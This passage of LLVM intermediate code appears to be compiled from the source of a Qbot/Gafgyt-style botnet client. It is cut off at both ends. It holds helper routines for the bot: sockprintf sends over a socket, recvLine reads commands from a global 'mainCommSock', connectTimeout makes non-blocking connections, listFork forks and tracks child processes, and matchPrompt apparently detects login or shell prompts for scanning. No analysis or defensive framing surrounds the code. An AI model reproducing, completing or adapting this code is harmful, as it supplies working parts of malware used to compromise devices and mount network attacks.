; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #9
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #9
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

; <label>:76:                                     ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %86

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %81, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %85

; <label>:53:                                     ; preds = %50
  %54 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %54, align 8
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %55, align 8
  br label %56

; <label>:56:                                     ; preds = %53
  %57 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %57, i64 0, i64 0
  %59 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %58) #5, !srcloc !3
  %60 = extractvalue { i64, i64* } %59, 0
  %61 = extractvalue { i64, i64* } %59, 1
  %62 = trunc i64 %60 to i32
  store i32 %62, i32* %14, align 4
  %63 = ptrtoint i64* %61 to i64
  %64 = trunc i64 %63 to i32
  store i32 %64, i32* %15, align 4
  br label %65

; <label>:65:                                     ; preds = %56
  %66 = load i32, i32* %5, align 4
  %67 = srem i32 %66, 64
  %68 = zext i32 %67 to i64
  %69 = shl i64 1, %68
  %70 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %71 = load i32, i32* %5, align 4
  %72 = sdiv i32 %71, 64
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 %73
  %75 = load i64, i64* %74, align 8
  %76 = or i64 %75, %69
  store i64 %76, i64* %74, align 8
  %77 = load i32, i32* %5, align 4
  %78 = add nsw i32 %77, 1
  %79 = call i32 @select(i32 %78, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %79, i32* %12, align 4
  %80 = icmp sle i32 %79, 0
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %65
  %82 = load i32, i32* %13, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %13, align 4
  br label %50

; <label>:84:                                     ; preds = %65
  br label %85

; <label>:85:                                     ; preds = %84, %50
  br label %86

; <label>:86:                                     ; preds = %85, %33
  store i32 0, i32* %18, align 4
  %87 = load i8*, i8** %6, align 8
  store i8* %87, i8** %17, align 8
  br label %88

; <label>:88:                                     ; preds = %106, %86
  %89 = load i32, i32* %7, align 4
  %90 = add nsw i32 %89, -1
  store i32 %90, i32* %7, align 4
  %91 = icmp sgt i32 %89, 1
  br i1 %91, label %92, label %109

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* @mainCommSock, align 4
  %94 = call i64 @recv(i32 %93, i8* %16, i64 1, i32 0)
  %95 = icmp ne i64 %94, 1
  br i1 %95, label %96, label %98

; <label>:96:                                     ; preds = %92
  %97 = load i8*, i8** %17, align 8
  store i8 0, i8* %97, align 1
  store i32 -1, i32* %4, align 4
  br label %112

; <label>:98:                                     ; preds = %92
  %99 = load i8, i8* %16, align 1
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 1
  store i8* %101, i8** %17, align 8
  store i8 %99, i8* %100, align 1
  %102 = load i8, i8* %16, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 10
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %98
  br label %109

; <label>:106:                                    ; preds = %98
  %107 = load i32, i32* %18, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %18, align 4
  br label %88

; <label>:109:                                    ; preds = %105, %88
  %110 = load i8*, i8** %17, align 8
  store i8 0, i8* %110, align 1
  %111 = load i32, i32* %18, align 4
  store i32 %111, i32* %4, align 4
  br label %112

; <label>:112:                                    ; preds = %109, %96
  %113 = load i32, i32* %4, align 4
  ret i32 %113
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %100

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %91

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #10
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %89

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #5, !srcloc !4
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #5
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %100

; <label>:86:                                     ; preds = %79
  br label %88

; <label>:87:                                     ; preds = %63
  store i32 0, i32* %5, align 4
  br label %100

; <label>:88:                                     ; preds = %86
  br label %90

; <label>:89:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %100

; <label>:90:                                     ; preds = %88
  br label %91

; <label>:91:                                     ; preds = %90, %37
  %92 = load i32, i32* %6, align 4
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %15, align 8
  %95 = load i64, i64* %15, align 8
  %96 = and i64 %95, -2049
  store i64 %96, i64* %15, align 8
  %97 = load i32, i32* %6, align 4
  %98 = load i64, i64* %15, align 8
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i64 %98)
  store i32 1, i32* %5, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %89, %87, %85, %36
  %101 = load i32, i32* %5, align 4
  ret i32 %101
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #5
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #5
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.113, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

; <label>:34:                                     ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

; <label>:46:                                     ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

; <label>:58:                                     ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

; <label>:70:                                     ; preds = %58, %46, %34, %22
